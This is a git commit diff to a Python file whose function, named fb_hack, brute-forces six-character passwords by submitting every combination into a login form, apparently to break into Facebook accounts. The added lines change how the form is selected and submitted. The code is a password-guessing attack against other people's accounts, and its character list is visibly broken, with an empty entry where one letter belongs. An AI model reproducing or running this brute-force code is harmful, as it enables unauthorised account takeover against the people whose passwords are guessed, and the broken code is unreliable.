a511256f8f173243ea0a7068e6ab54da2f81be53
krarktel112 <krarktel@gmail.com>
2024-09-24 15:18:47 -0400

    Update Test.py

--- Test.py
+++ Test.py
@@ -62,6 +62,8 @@ def fb_hack(email, codex):
   for combination in  itertools.product([0,1,2,3,4,5,6,7,8,9,"a","b","c","d","e","f","g","h","i","j","k","l","m","n","o","p","q","r","s","t","u","v","w","x","y","z","A","B","C","D","E","F","G","H","I","J","K","L","M","N","O","P","Q","R","S","T","U","V","","X","Y","Z"], repeat=6):
     x = (''.join(map(str, combination)))
     try:
+      browser.select_form(nr=0)
+      browser.submit()
       browser.form['pass'] = x
       browser.submit()
     except:
